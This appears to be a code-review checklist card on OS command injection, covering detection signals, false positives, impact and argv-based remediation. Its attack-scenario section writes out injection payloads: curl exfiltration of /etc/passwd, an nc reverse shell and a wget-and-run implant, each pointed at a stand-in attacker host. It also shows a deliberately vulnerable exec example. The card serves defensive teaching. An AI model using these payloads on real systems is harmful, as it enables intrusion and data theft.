---
id: P36
name: OSCommandInjection
area: V1 Encoding and Sanitization
refs: ASVS V5.3.x / WSTG-INPV-12 / CS: OS Command Injection Defense, Injection Prevention
requires: [backend, subprocess]
---

# P36 — OS Command Injection

## Overview
OS Command Injection occurs when request-controlled input is concatenated (or interpolated) into a string that is passed to a **shell** for execution, allowing an attacker to break out of the intended argument and append new commands, pipes, or redirections (`;`, `|`, `&&`, `$()`, backticks). The root cause is always the same: untrusted data reaches a shell interpreter (`/bin/sh -c`, `cmd.exe /c`) rather than being supplied as a discrete argv element. Even a single shell metacharacter in the right position yields arbitrary code execution under the application's privileges, which is typically game-over for the host. The high-leverage distinction is **string/shell mode vs. array/argv mode**: the former parses metacharacters, the latter does not.

## What to check
- Does any handler pass request-derived data (`req.query`, `req.params`, `req.body`, `req.headers`, `req.files`) into a process-spawning API?
- Is the call using **shell mode** — a single command string that the OS shell parses — versus **array mode** (argv list, no shell)? `child_process.exec` is always shell; `execFile`/`spawn` are shell only when `shell:true` or the command is a string on Windows.
- Is input concatenated into a command string with template literals, `+`, `.format()`, `%s`, `StringBuilder`, or shell `"..."`?
- Are file names, URLs, hostnames, user IDs, or report parameters forwarded to a CLI tool (`pdfinfo`, `convert`, `dig`, `curl`, `nslookup`, `git`, `ffmpeg`, `ping`)?
- Does the code reach for `eval` / `Function()` / `vm.runInNewContext` on request data (functionally equivalent to RCE in Node)?
- Is the spawned process running as root / a privileged service account, amplifying a successful injection?

## Static signals
Shell mode + interpolation:
- `child_process.exec(\`pdfinfo ${req.query.file}\`)` — Node, shell via `/bin/sh -c`
- `child_process.exec(\`dig ${host} +short\`)` — Node
- Python: `os.system(f"convert {file} out.png")`, `subprocess.run(f"ping {host}", shell=True)`, `subprocess.Popen(cmd, shell=True)`, `eval(req.body.expr)`, `pexpect.spawn("... " + host)`
- Java: `Runtime.getRuntime().exec("nslookup " + host)` (single-string overload — tokenized, not argv-safe), `new ProcessBuilder("sh", "-c", "convert " + file)`, Jython/Groovy `eval`
- Go: `exec.Command("sh", "-c", "nslookup "+host)`, `exec.CommandContext(ctx, "bash", "-c", fmt.Sprintf("du -sh %s", path))`
- PHP: `system($_GET['cmd'])`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, backticks `` `...$host...` ``
- Ruby: `` `nslookup #{params[:host]}` ``, `system("convert #{file}")`, `IO.popen`, `Open3.capture2` with a shell string
- C#: `Process.Start("cmd.exe", "/c nslookup " + host)`, `System.Diagnostics.Process` with `UseShellExecute`
- Rust: `std::process::Command::new("sh").arg("-c").arg(format!("du -sh {}", path))`
- Dangerous evaluators: `eval(`, `Function(`, `vm.runInNewContext(`, `new Function(`, `child_process.exec(`

## False positives
- Array mode with no shell: `execFile('pdfinfo', [validatedPath])`, `spawn('dig', [host, '+short'])`, `subprocess.run(['convert', file, 'out.png'])` (no `shell=True`), Java `ProcessBuilder(List.of("nslookup", host))`, Go `exec.Command("nslookup", host)`. The argv elements are passed verbatim — metacharacters are literal.
- Input was validated against a strict allow-list (UUID, integer parsed via `parseInt`, hostname regex, fixed enum) so it cannot carry `;`, `|`, spaces, or `$()`.
- The command string is a fully static literal with zero request-derived content interpolated.
- The code runs in a sandboxed/locked-down container with no outbound network and a read-only FS — still a finding, but severity is capped.

## Attack scenario
1. The app exposes a "convert uploaded document" endpoint that calls `child_process.exec(\`pdfinfo ${req.query.file}\`)`.
2. Attacker sends `?file=report.pdf; curl http://attacker.ex/$(cat /etc/passwd | base64)`.
3. The shell parses the `;`, executes `pdfinfo report.pdf`, then runs the attacker's `curl`, exfiltrating `/etc/passwd`.
4. Variants: `?file=x; nc -e /bin/sh attacker.ex 4449` (reverse shell), `?file=x && wget http://attacker.ex/payload.sh -O /tmp/p && bash /tmp/p` (implant), or `$()`/backtick sub-shells that work even when `;` and `|` are filtered.
5. The attacker operates under the application's OS account — read secrets, pivot to other services, establish persistence.

## Impact
- **Confidentiality**: full read of files the app account can access — secrets, DB credentials, private keys, other users' data.
- **Integrity**: arbitrary write/modify/delete of files, DB tampering, backdoor installation, supply-chain poisoning of build outputs.
- **Availability**: process kill, data wipe, ransomware-style encryption, turning the host into a crypto miner / DoS bot.
- Severity is Critical when the process runs as root or has cloud-instance-metadata/SSM access; High otherwise. RCE is a direct path to full host compromise.

## Remediation
Use array/argv mode and never interpolate into a shell string:
```ts
// VULNERABLE — shell string mode, metacharacters are parsed
import { exec } from 'node:child_process';
app.get('/info', (req, res) => exec(`pdfinfo ${req.query.file}`, ...));

// SAFE — argv array, no shell; input validated to an allow-listed path
import { execFile } from 'node:child_process';
const file = path.parse(req.query.file).base; // strip traversal, no shell metacharacters
app.get('/info', (req, res) => execFile('pdfinfo', [file], { shell: false }, ...));
```
Where a shell is unavoidable, prefer a feature-rich library over string concatenation and validate input against a strict allow-list; never rely on deny-lists of metacharacters (they are bypassable via encoding, IFS, newline, and quoting edge cases). Defense-in-depth: run the worker process as a low-privilege user in a seccomp/container sandbox with egress filtering so an injection cannot reach its C2.

## References
- OWASP ASVS V5.3.x — Input validation and injection prevention
- OWASP WSTG-INPV-12 — Testing for OS Command Injection
- OWASP Cheat Sheets: OS Command Injection Defense, Injection Prevention
